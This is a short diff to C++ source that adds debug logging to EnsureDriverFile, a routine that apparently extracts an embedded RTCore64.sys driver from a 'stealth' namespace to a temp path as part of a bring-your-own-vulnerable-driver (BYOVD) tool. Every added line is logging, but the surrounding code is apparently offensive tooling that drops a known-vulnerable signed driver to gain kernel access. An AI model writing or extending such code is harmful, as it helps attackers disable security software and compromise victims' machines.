@@ -236,6 +236,9 @@ static std::wstring EnsureDriverFile(const std::wstring& driverName) {
         if (driverName == L"RTCore64.sys") {
             embedData = stealth::embedded::RTCore64_data;
             embedSize = stealth::embedded::RTCore64_size;
+            ByovdDiag("BYOVD:EnsureDriverFile: matched RTCore64, embed=0x%p size=%zu\n", embedData, embedSize);
+        } else {
+            ByovdDiag("BYOVD:EnsureDriverFile: driverName '%ls' != RTCore64.sys\n", driverName.c_str());
         }
 
         if (embedData && embedSize > 0) {
@@ -249,9 +252,16 @@ static std::wstring EnsureDriverFile(const std::wstring& driverName) {
                 out.close();
 
                 if (GetFileAttributesW(tempPath) != INVALID_FILE_ATTRIBUTES) {
+                    ByovdDiag("BYOVD:EnsureDriverFile: extracted to %ls\n", tempPath);
                     return std::wstring(tempPath);
+                } else {
+                    ByovdDiag("BYOVD:EnsureDriverFile: file not found after write: %ls (err=%u)\n", tempPath, GetLastError());
                 }
+            } else {
+                ByovdDiag("BYOVD:EnsureDriverFile: ofstream open FAILED for %ls\n", tempPath);
             }
+        } else {
+            ByovdDiag("BYOVD:EnsureDriverFile: embedData=0x%p or embedSize=%zu — skipping\n", embedData, embedSize);
         }
     }
 
